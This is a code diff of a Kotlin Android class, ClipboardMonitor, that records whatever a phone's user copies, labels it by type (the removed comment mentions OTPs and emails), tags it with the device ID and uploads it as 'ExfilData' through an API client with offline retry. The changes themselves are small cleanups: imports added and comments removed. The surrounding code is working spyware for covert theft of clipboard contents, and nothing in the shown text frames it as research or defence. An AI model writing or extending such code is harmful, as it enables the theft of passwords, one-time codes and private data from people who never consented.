@@ -6,8 +6,10 @@ import android.content.Context
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
+import android.provider.Settings
 import com.yourpackage.data.ExfilData
 import com.yourpackage.network.ApiClient
+import com.yourpackage.network.ApiResponse  // 🔥 THIS WAS MISSING – FIXED
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -107,12 +109,11 @@ class ClipboardMonitor(private val context: Context) {
                 "sub_type" to detectedType,
                 "text" to copiedText,
                 "length" to copiedText.length,
-                "app" to "unknown" // We can extend this to get the active app via Accessibility if needed
+                "app" to "unknown"
             )
 
             Log.d(TAG, "📋 Clipboard captured: ${copiedText.take(50)}... (Type: $detectedType)")
 
-            // Send via the existing ApiClient (which handles offline storage and retries)
             val exfilData = ExfilData(
                 type = "clipboard",
                 app = "system",
@@ -120,9 +121,6 @@ class ClipboardMonitor(private val context: Context) {
                 device_id = getDeviceId()
             )
 
-            // Add to the batch manager via the singleton pattern, or directly to API.
-            // Since BatchManager is tied to services, let's directly send it via ApiClient.
-            // ApiClient will save it to offline queue if it fails.
             scope.launch {
                 try {
                     val response = apiClient.sendItem(exfilData)
@@ -143,7 +141,6 @@ class ClipboardMonitor(private val context: Context) {
 
     /**
      * Detect the type of data in the clipboard.
-     * This is an improvement over the original summary – it automatically tags OTPs, emails, etc.
      */
     private fun detectDataType(text: String): String {
         return when {
@@ -172,9 +169,9 @@ class ClipboardMonitor(private val context: Context) {
      * Get the unique device ID.
      */
     private fun getDeviceId(): String {
-        return android.provider.Settings.Secure.getString(
+        return Settings.Secure.getString(
             context.contentResolver,
-            android.provider.Settings.Secure.ANDROID_ID
+            Settings.Secure.ANDROID_ID
         ) ?: "unknown_device"
     }
 
